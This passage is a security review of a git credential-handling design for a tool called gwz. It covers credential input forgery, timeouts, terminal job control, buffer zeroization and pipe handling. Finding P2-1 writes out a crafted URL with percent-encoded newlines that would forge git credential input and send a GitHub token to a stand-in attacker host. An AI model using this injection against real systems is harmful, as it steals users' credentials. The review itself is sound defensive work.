## 1. Findings

### [P2-1] OQ1 (b) adds URL-derived text to `git credential fill`'s input without the rule that keeps it from forging input lines

- **Root cause.** §2.2 (line 45) grounds "U … cannot add a line to git's input" on U holding no raw control character. That property does not survive git's percent-decoding; the real bound today is that the endpoint writes U percent-encoded exactly as parsed and git refuses any URL component that decodes to a newline. OQ1 (b) (lines 271-273, the recommended option) then says "carry the URL's username in the Open's destination … and pass it to `git credential fill`" with no form stated. The natural implementation — the structured taut destination carries the username decoded, as it does for SSH (DES:200-202), and the endpoint writes `username=<value>` — reintroduces the forgery the encoded `url=` line prevents.
- **Location.** Draft §2.2 line 45; §12 OQ1 (b) lines 271-273; §3.1 line 56 (input form). Code: `EP/https_destination.rs:16-18` (the control-character check runs on the *encoded* input string), `:179-186` (username refused today), `:188-198` (a `%` in the host is refused, a `%` in userinfo or path is not).
- **Violated invariant.** §1.3/§5: the credential goes to the URL that challenged and to no other; REQ G4: destinations "validated into credential-free fields before Open/helper/network activity".
- **Reproduction (under (b) as worded).** A member's URL, from a shared workspace manifest: `https://alice%0Aurl=https%3A%2F%2Fgithub.com%2F%0A@evil.example/repo.git`. `Destination::parse` admits it (no raw control character; host `evil.example`). Anonymous discovery at evil.example answers 401 `Basic`. The endpoint writes `url=https://evil.example/repo.git`, then `username=alice`, `url=https://github.com/`, blank line (the decoded username split on its newline). git's `credential_read` treats the later `url=` as a fresh credential for github.com, runs the helpers configured for it (`gh`), and prints that token; the endpoint builds `Basic` from it and sends it to U = evil.example (§5, "requests whose repository base is U"). Written percent-encoded inside `url=` instead, git refuses the username ("url contains a newline") and the member fails with M2 — safe, but nothing in the text requires that form.
- **Impact.** A credential for one host delivered to a host chosen by whoever writes the member URL. Rated P2 as a defect in the design text's recommended option; shipped as worded it would be a P0.
- **Required correction.** (1) Under (b), state the form: the username reaches git only inside the `url=` line, percent-encoded exactly as the parsed URL serializes it, never as a decoded `username=` line and never re-serialized from a decoded destination field without re-encoding; or, equivalently, the destination refuses a username or path that decodes to any control character before any Open. (2) §2.2 line 45 states the real bound: the endpoint writes U percent-encoded as parsed, and git refuses a component that decodes to a newline. (3) Under (a) nothing changes except (2).
- **Closure test.** A §10 row: a path (and, under (b), a username) carrying `%0A`: `git credential fill` exits non-zero, M2, the recording helper never runs, no Authorization is sent; a username carrying `%3A` under (b) reaches the recording helper as one `username=a:b` line with no `password=` line; `%0D` asserts the chosen rule. The text change is verified by re-read in the re-review.

### [P3-1] The permit wait is charged to the interaction allowance, so a queued member gets less than the stated allowance, M4's text is false for it, and the latch can fire on a lookup that never ran

- **Root cause.** §3.3 keeps today's accounting: the endpoint's eight permits are "awaited within that budget" (line 70), and the allowance is per Open (line 69; `driver.rs:631` sets 120 s per Open). In code the permit wait consumes `budget.helper` before the lookup's own deadline is computed (`EP/https_worker.rs:323-338`; a wait that exhausts it returns `Timeout` from `acquire_slot`, `:653-668`). The permits are per endpoint, not per host, while gwz runs up to eight members per host (REQ:100-102).
- **Location.** §3.3 lines 69-70; §4 Timeout row and "Latched" (lines 94, 100); M4 (line 248); OQ3 (b)'s cost (line 281).
- **Violated invariant.** D10/N5: the bound is "the interaction allowance" for the helper; §11: a message states what happened.
- **Interleaving** (OQ3 (a) or (b); members on three hosts, eight private members each, no stored credential, a helper that opens a window): twenty-four lookups want eight permits. Members 1-8 hold them while their windows wait on the user (~100 s). Member 9 waits ~100 s for a permit inside its own 120 s, starts with ~20 s, its window opens, and at 120 s it fails with M4 "did not answer within 120 seconds, and was stopped" — for a helper that ran 20 s. Member 17 waits the full 120 s and fails with the same M4 having started no helper; if that timeout latches its host (§4 does not say it must not), that host's later members fail at once. 1.0.17 waits for each window.
- **Impact.** A user told the helper was stopped when it never started; an allowance that is 120 s on paper and may be zero for a queued member; a latch set by a lookup that never ran.
- **Required correction.** Either charge the permit wait to the Open's allocation deadline and start the allowance when the lookup starts, or keep the charge and give the permit-wait timeout its own §4 row and message ("no helper was started: the operation's other helpers used the allowance"), excluded from the latch, with OQ3 (b)'s hazard stating that queued members share the allowance.
- **Closure test.** A T5-style row: nine members over two hosts, a fixture helper that sleeps S with allowance A (S < A < 2S): members 1-8 succeed; member 9 waits S, starts with A−S, times out; assert the chosen message, and that the latch rule holds.

### [P3-2] §8 says the latch "cannot break a working setup"; under OQ3 (a)/(b) the design's own OQ3 (b) text says it does

- **Root cause.** §8 line 171 lists "one lookup per route, the latch (§4) and connection scopes" as choices that "change failure timing and connection reuse, not whether a working setup succeeds". OQ3 (b) line 281 states the opposite consequence: "A sign-in slower than the interaction allowance fails with M4, and the latch (§4) then fails that host's other lookups in the operation." The §8 list is what the operator reads to learn which of the design's own choices can break a 1.0.17 setup.
- **Location.** §8 line 171 against OQ3 (b) line 281.
- **Interleaving** (OQ3 (b), one host, eleven private members, per-host concurrency eight): member 8's window is answered at 130 s → M4 at 120 s (D10, listed) and the latch is set; member 11, which starts after an earlier member finishes at ~130 s, is failed at once by the latch although its window would have been answered. On 1.0.17 member 11 prompts and waits. D10 breaks member 8; the latch additionally breaks member 11 without giving it its allowance.
- **Impact.** The operator's can-break list is incomplete for the recommended option.
- **Required correction.** Move the latch into the can-break list conditioned on OQ3 (a)/(b), or restrict the latch to OQ3 (c) (where a timeout means a hung helper, not a slow user), and make §8 and OQ3 (b) say the same thing.
- **Closure test.** Text re-read; optionally the member-11 interleaving as a row with short times.

### [P3-3] The terminal claims are overgeneral: a helper that reaches the terminal through a daemon in another session is neither stopped nor killed

- **Root cause.** §3.2 line 65: "A helper that reads the terminal is outside the foreground group, so the terminal stops it, and the bound kills it." OQ3 (b) line 281 ("stopped there, and fails with M4") and line 283 ("the terminal stays gwz's, and every kill reaches the helper") and N4 (line 260) rest on it. Job control stops a process only when it reads its *controlling* terminal from a background group of that terminal's session; a prompt shown by a process in another session that opens the tty by name is not subject to it, and a group kill does not reach it.
- **Location.** §3.2 line 65; OQ3 (b) lines 281, 283; N4 line 260.
- **Reproduction.** `credential.helper=!pass-git-helper` (any `pass`/`gpg`-backed helper), gpg-agent running with `pinentry-curses` or `pinentry-tty`, passphrase not cached. gwz fetches a private member; gpg-agent (its own session) spawns pinentry, which draws over gwz's terminal and reads the keyboard. Answered within the allowance, the lookup succeeds. Otherwise at the bound git, the helper and gpg are killed; pinentry stays on the terminal until answered or cancelled, after gwz has reported M4 or exited.
- **Impact.** The operator chooses among OQ3's options on a rationale ("the terminal stays gwz's", "every kill reaches the helper") that is false for this class; a prompt left on the terminal after M4. Not worse than 1.0.17, which bounds nothing.
- **Required correction.** Scope the §3.2 sentence to processes in the spawned group; state in OQ3 and N4 that a helper prompting through another session's agent (gpg-agent's pinentry) is neither stopped nor killed and may remain after M4, as on 1.0.17.
- **Closure test.** Text; optionally a unit row: a fixture helper whose `setsid` child sleeps; the lookup ends at the bound and the child survives, asserted and documented.

### [P3-4] Output buffers are required to be zeroized only on the completion path

- **Root cause.** §3.4 line 77 reads "stdout is read into a buffer sized to the limit … and then zeroized", the completion path. The lookup's other exits abandon the buffers: on timeout, cancellation or overflow the `work` future is dropped with the partly read `stdout` and `stderr` buffers, plain `Vec<u8>` freed without zeroization (`EP/https_auth.rs:352-387`, `:409-424`; `:348` zeroizes only on completion). The design fixes `Secret::header`'s leftovers (line 78) but not this one, and §3.5 keeps "bounded pipes" as they are (line 82).
- **Location.** §3.4 line 77; §3.3 line 72.
- **Violated invariant.** §3.4 "no growth leaves an unzeroed copy"; HTTPS:168-169 "clear owned buffers on disposal".
- **Interleaving.** git has written the credential (stdout EOF) while a holder of git's stderr keeps the lookup pending (P3-5's class), or a cancellation lands after the read; the bound or cancel drops the buffer with the credential in it. stderr can hold secrets too: a Git Credential Manager trace setting in the snapshot writes them there.
- **Impact.** A credential left in freed memory until reuse; bounded to process memory; the class 1.0.17's plain copies already belong to.
- **Required correction.** The stdout and stderr buffers are zeroize-on-drop types pre-sized to the limit, so every exit path, the select!'s abandoned branches and unwinds included, zeroizes; state it in §3.4.
- **Closure test.** A unit test with a drop-observing buffer type, or the buffer type confirmed in the implementation review; the rule in the text.

### [P3-5] The lookup completes only when every holder of git's stderr closes it, not when git exits

- **Root cause.** §3.3 "Pipes" (line 72) drains stderr, and the kept structure (`EP/https_auth.rs:336-339`) joins stdin, stdout and stderr to EOF before `wait()`. git gives its helper a private stdout pipe and its own stderr, and waits for the helper's exit before printing the credential, but not for the helper's descendants; a background process the helper leaves with stderr open holds gwz's pipe after git has exited.
- **Location.** §3.3 line 72; §4 (no row for this outcome); D10/N5 ("a hanging helper": this helper does not hang).
- **Reproduction.** Helper: `printf 'username=u\npassword=p\n'; sleep 300 >/dev/null &` (stdout redirected so git itself completes; stderr inherited). git exits with the credential; stdout's EOF arrives; stderr's does not. At the bound the lookup fails with M4 and latches the host; the group kill then kills the background process, which stayed in the group. 1.0.17 (`cred.rs:395-399, 451`: piped stderr, `wait_with_output`) hangs forever on the same helper, so this is not worse, but it is unstated, and the design can trivially be better.
- **Impact.** Every lookup through such a helper fails after the allowance and latches its host; the group kill reaches a process the helper meant to leave running.
- **Required correction.** The lookup completes on git's exit with stdout EOF; the stderr reader is abandoned then, within the same bound. Otherwise state the class in N5.
- **Closure test.** The fixture helper above: the credential is returned within one second, no M4, and the background child is untouched.

## 3. Risks and next action

- **R1. The Windows root as working directory (TR1.8).** C10's root directory is directory-creatable by any authenticated Windows user; git's `safe.directory` ownership check (2.35.2+) refuses another user's planted `C:\.git`, and the same user's planting is within their own trust domain. TR1.8 should state this bound; the draft's "reads no repository's local configuration" (line 64) is unconditional.
- **R2. N3's relative helper paths.** A `!./bin/x` helper run in `/` starts `/bin/x`, not nothing; harmless, but "no longer starts" is inaccurate.
- **R3. N2's wording.** A helper 1.0.17 never ran may answer with another account's valid credential, not only a stale one: a 404/M3 on fetch, or a push authorized under the other account. One clause.
- **R4. Redirect plus prompting.** Under OQ3 (a)/(b), an anonymous redirect can make a window appear for a host the user did not name (§2.2's steering plus N4's window). Same as 1.0.17; a sentence joining N4 and N7 would make the phishing shape explicit.
- **R5. OQ3 (b)'s unchecked recollection** of the Git Credential Manager's behaviour under `GIT_TERMINAL_PROMPT=0` is flagged by the draft; if wrong, the fallback is bounded (a terminal prompt stops, M4 at the bound). The dabeest row is the right gate.
- **R6. No `Capacity` row in §4.** Unreachable in 1.1.0 as analysed above; a defensive row costs one line and protects a future shape that shares slots across endpoints (REUSE §6).
- **R7. Trace settings in the snapshot.** `GIT_TRACE*`, `GCM_TRACE*` make git and helpers write diagnostics, possibly secrets, to stderr (discarded here) or to files the user named; the user's own choice, not gwz's exposure; S7.2 may say so.
- **R8. T13 live evidence** needs the operator's go; OQ4's recommendation rests on a "moderately" sure recollection of GitHub's rename behaviour, and the draft says so.
- **R9. git facts to pin.** The git-source facts listed in §0 carry P2-1's bound and P3-5's analysis; TR2.22 should confirm them against the git version its CI runs and record the version.

**Next action.** Revision 2 resolving P2-1 as specified (the input form under OQ1 (b), the real bound in §2.2, and the `%0A`/`%3A` rows), with the P3s the lane owner accepts; then a Safety re-review of the revision, which can close P2-1 on the text and the named rows.
